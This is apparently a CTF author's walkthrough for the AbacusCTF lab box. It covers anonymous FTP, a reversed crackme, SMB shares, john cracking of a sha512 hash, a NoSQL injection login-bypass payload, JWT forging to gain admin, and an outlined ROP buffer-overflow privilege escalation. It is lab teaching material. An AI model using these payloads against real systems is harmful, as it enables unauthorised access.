# Walkthrough

#### SPOILER: 
- The box pwned in an unintended way. My mistake :( that I forgot to turn off the developer account in vagrant. 
So if you make an all port scan , you get vagrant port opened and you can login using vagrant default credentials 
and become a sudo user. Below mentioned is the intented way to pwn the box.

> All the automation scripts code for solving the room will be found at
[Automation Script](https://github.com/blessingcharles/AbacusCTF/tree/main/utilities)

> Topics Involved
1. OSINT
2. Reverse Engineering
3. Vigener cipher [polyalphabetic substitution]
4. wireshark dump + sha512 bruteforce(rockyou.txt)
5. python pickle dump
6. Nosql Injection auth bypass
7. JWT forge
8. ROP binary exploitation [port forwarding to expose the internal port to the subnet]

#### Port Scanning nmap results

```bash
nmap -sC -sV -oA nmap/ 10.10.107.164

Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-23 15:15 IST
Nmap scan report for 10.10.107.164
Host is up (0.37s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 ftp      ftp         14472 Apr 22 15:05 crackme
|_-rw-r--r--    1 ftp      ftp          1012 Apr 22 15:05 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.36.149
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
5000/tcp open  http        Node.js Express framework
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VAGRANT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-23T09:46:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.88 seconds


```
## flag1 and flag2 [ftp]

1. port21 anonymous was login enabled

```bash
    ftp <server-ip>
    ftp> get crackme
    ftp> get message.txt
```

##### crackme

    - You need to reverse engineer , the given encrypter using tools like ghidra, source code in the repo under playground directory.
    
```cpp
unsigned char reduce(unsigned char *data, size_t len)
{
    unsigned char result = 0;
    for (size_t i = 0; i < len; i++)
    {
        result ^= ((data[i] << (i % 4)) | (data[i] >> (8 - i % 4)));
        result += data[i] ^ i;
    }
    return result;
}

void encrypt(unsigned char *data, size_t len, unsigned char key)
{
    unsigned char *encryptedData = new unsigned char[len];
    memcpy(encryptedData, data, len);

    for (size_t i = 0; i < len; i++)
    {
        encryptedData[i] = ((encryptedData[i] ^ key) & 0x7F) | ((encryptedData[i] & 0x80) >> 1) | ((key & 0x01) << 7);
        key = ((key << 1) | (key >> 7)) ^ i;
    }

    memcpy(data, encryptedData, len);
    delete[] encryptedData;
}

void generate_password(char *str, int len, int rotation_count)
{
    unsigned char hash[] = {0x43, 0x12, 0x17, 0x42, 0x18, 0x12,
                            0x87, 0x32, 0x61, 0x14, 0x54, 0x91,
                            0x39, 0x21, 0x54, 0x21, 0x67, 0x50};

    for (int i = 0; i < len; i++)
    {
        for (int j = 0; j < rotation_count; j++)
        {
            str[i] = str[i] ^ hash[i];
        }
    }
    unsigned char *ustr = reinterpret_cast<unsigned char *>(str);

    printf("\n Len : 0x%d \n", reduce(hash, len));

    encrypt(ustr, len, reduce(hash, len) % 0xf0);

    for (int i = 0; i < len; i++)
    {
        printf("0x%x , ", ustr[i]);
    }
}
```

##### message.txt

OSINT starting from linkedin


## flag 3 and 4 [smb]

The previous flags are used as username and password for smbclient

```bash
    smbclient //10.10.107.164/thomasthecatoonz -U thomasthecatoonz
    Enter WORKGROUP\thomasthecatoonz's password:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Fri Apr 22 19:56:04 2022
      ..                                  D        0  Fri Apr 22 19:56:04 2022
      chutney                             N      880  Sat Apr 23 08:50:41 2022
      message.txt                         N      966  Sat Apr 23 08:50:41 2022
      secretchat                          N    21948  Sat Apr 23 08:50:42 2022
```

##### chutney

-   As mentioned in the message.txt chutney it means pickled object of python
    so by doing reverse engineering the file we can get the flag

-   Algo:
    convert the hex to integer and then convert the long format to bytes format
    unpickle the content of the file and you'll get a list of tuples of emp-secret-{idx}
    so by reordering you will get the flag.


##### secretchat

-   In the chats we can see thomas and jerry talks about jwt secret
-   jerry shares his jwt secret in sha512 after cracking we found that armageddon391

```sha512
    Jerry: 60aa4d765ead6dcf8248681c5a444502fa23f9c26fd8885d7ae2571ee67558c6e6b1b33c2c6450d443baeadb3413058c5eeeb67d87f88da9584afa6c4a130586
```

    ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt myhash --format=raw-sha512
    ```


## flag 5 and 6 [Webserver]:

##### flag 5[No sql injection]

-   In the login page we can enter the employee secret which we got from smb. We can use burpsuite to
change it to nosql payload

- url : http://10.10.28.23:5000/login

```json
{
    "email": {
        "$gt": ""
    },
    "password": {
        "$gt": ""
    },
    "secret": "1p4v#dr45ht1"
}
```

    In localstorage we can get the flag and token ,the flag will be used as a username for ssh later

##### flag 6[jwt bypass]

- As we already got the jwt secret  we sign our own jwt secret to become admin .
- We can use jwt.io website to see what are the contents of the token .
- It has a field of isAdmin: false , we change it to true and query the /api/secret endpoint
and put the forged token in Authorization header to get admin privilege of site and get ssh password
as flag

## flag7 user.txt

- with the ssh username and password we can login as user
- for stabilizing the shell
```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
    cat .user.txt
```
    
## flag8 root.txt

- A daemon service is running as port 8036 running as root  so we can exploit it and get root
- Vulnerability buffer overflow
- Get the libc and binary file from the server to get the correct versions for the exploit to work  
- We need to bruteforce the stack canary , rbp , rip to bypass aslr , pie mitigations
- We need to use ROPgadgets to get root shell
- Automation script is in the above provided github
- Full walkthrough of binary exploitation [link](https://github.com/blessingcharles/AbacusCTF/blob/main/binexploit.pdf).
```bash
    cat .root.txt
```
